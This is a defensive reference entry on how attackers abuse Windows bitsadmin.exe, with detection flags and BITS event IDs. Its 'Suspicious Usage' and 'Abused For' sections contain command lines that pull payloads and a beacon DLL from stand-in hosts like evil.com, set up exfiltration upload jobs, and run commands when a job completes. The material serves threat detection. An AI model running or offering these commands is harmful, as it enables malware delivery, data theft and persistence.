# bitsadmin.exe — Background Intelligent Transfer Service

## Description
Command-line tool for managing BITS (Background Intelligent Transfer Service). BITS is a Windows component that facilitates asynchronous file transfers. Attackers abuse BITS for downloading payloads and maintaining persistence.

## Abused For
- **File download:** `bitsadmin.exe /transfer job1 /download /priority high http://malicious.com/payload.exe C:\temp\payload.exe`
- **Persistence:** BITS jobs survive reboots and can be set to retry
- **File upload:** Exfiltrate data via BITS upload jobs
- **Defense evasion:** BITS traffic uses HTTP/HTTPS and blends with Windows Update traffic

## Suspicious Usage
```
bitsadmin.exe /transfer job1 /download /priority high http://evil.com/payload.exe C:\Users\Public\payload.exe
bitsadmin.exe /create /download /upload job2 http://evil.com/exfil.txt C:\secret\data.txt
bitsadmin.exe /addfile job3 http://evil.com/beacon.dll C:\Windows\Tasks\beacon.dll
bitsadmin.exe /setnotifycmdline job4 cmd.exe "cmd.exe /c calc.exe"
bitsadmin.exe /resume job4
```

## Normal Usage
```
bitsadmin.exe /transfer job /download /priority normal http://update.example.com/update.msu C:\temp\update.msu
bitsadmin.exe /list /allusers
```

## Detection Flags
- BITS jobs referencing non-corporate domains
- BITS jobs with notification command lines pointing to uncommon executables
- BITS transfers outside of Windows Update context
- `bitsadmin.exe` used with `/setnotifycmdline` (execution on job completion)
- Event ID 60 (BITS job created), 61 (BITS job transferred), 62 (BITS job error)
